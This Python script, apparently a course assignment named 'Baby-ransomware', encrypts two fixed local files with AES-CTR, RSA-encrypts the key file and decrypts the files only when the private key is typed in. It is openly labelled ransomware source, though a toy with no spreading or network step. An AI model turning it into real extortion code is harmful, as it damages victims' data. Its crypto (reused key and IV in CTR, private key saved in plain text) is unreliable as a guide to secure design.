import json
from Crypto.PublicKey import RSA
from Crypto.Cipher import PKCS1_OAEP
import pyaes, pbkdf2, binascii, os, secrets

keyPair = RSA.generate(2048)
pubKey = keyPair.publickey()
encryptor = PKCS1_OAEP.new(pubKey)
decryptor = PKCS1_OAEP.new(keyPair)
key = os.urandom(32)  #  32 bytes == 256 bits
iv = secrets.randbits(128) # 128 bits == 16 bytes
def CreateRSAkey():
    data = {
        "Public_key" : hex(pubKey.n),
        "Private_key" :hex(keyPair.d)
            }
    
    with open('Keypair.txt', 'w+') as f:
        json.dump(data, f, indent=4, ensure_ascii=False)
        f.write('\n')

def Encryption(): 
    print("AES KEY :",binascii.hexlify(key))
    print("IV :",iv)
    
    with open('Text.txt', 'rb') as f:
        s = f.read()
        aes = pyaes.AESModeOfOperationCTR(key, pyaes.Counter(iv))
        ciphertext = aes.encrypt(s)
        f.close()
    with open('Text.txt', 'wb') as f:
        s = f.write(ciphertext)
        f.close()
    with open('Picture.jpg', 'rb') as f:
        s = f.read()
        aes = pyaes.AESModeOfOperationCTR(key, pyaes.Counter(iv))
        ciphertext = aes.encrypt(s)
        f.close()
    with open('Picture.jpg', 'wb') as f:
        s = f.write(ciphertext)
        f.close()
    Localkey = {
        "AES" : str(binascii.hexlify(key)),
        "IV" : str(iv)
    }
    with open('LocalKey.txt', 'w+') as f:
        json.dump(Localkey, f, indent=4, ensure_ascii=False)
        f.write('\n')
    with open('LocalKey.txt', 'rb') as f:
        s = f.read()
        ciphertext = encryptor.encrypt(s)
        f.close()
    with open('LocalKey.txt', 'wb') as f:
        s = f.write(ciphertext)
        f.close()     


def Decryption():
    while(1):
        private = input("Input Private Key : ")
        if private == hex(keyPair.d) :
            with open('LocalKey.txt', 'rb') as f:
                s = f.read()
                paintext = decryptor.decrypt(s)
                f.close()
            with open('LocalKey.txt', 'wb') as f:
                s = f.write(paintext)
                f.close()
            with open('LocalKey.txt', 'r') as f:
                s = f.read()
                print(s)
                f.close()
            with open('Text.txt', 'rb') as f:
                s = f.read()
                aes = pyaes.AESModeOfOperationCTR(key, pyaes.Counter(iv))
                paintext = aes.decrypt(s)
                f.close()
            with open('Text.txt', 'wb') as f:
                s = f.write(paintext)
                f.close()
            with open('Picture.jpg', 'rb') as f:
                s = f.read()
                aes = pyaes.AESModeOfOperationCTR(key, pyaes.Counter(iv))
                ciphertext = aes.decrypt(s)
                f.close()
            with open('Picture.jpg', 'wb') as f:
                s = f.write(ciphertext)
                f.close()
            
            break
        else:
            print("Private Key not correct")



if __name__ == '__main__':
    while True:
        CreateRSAkey()
        print('{:-<50}'.format(' '))
        print('{:^50}'.format('Assignment: Baby-ransomware'))
        print('{:-<50}'.format(' '))
        print('{:15}{:<}'.format('','1 : Encryption'))
        print('{:15}{:<}'.format('','2 : Decryption'))
        print('{:13}{:<}'.format('','Press x to exit Program'))
        print('{:-<50}'.format(' '))
        print("Select option")
        answer = input()
        if answer == '1':
            print('{:-<50}'.format(' '))
            Encryption()
        elif answer == '2':
            print('{:-<50}'.format(' '))
            Decryption()
        elif answer == 'x':
            exit()
        else:
            print("select again")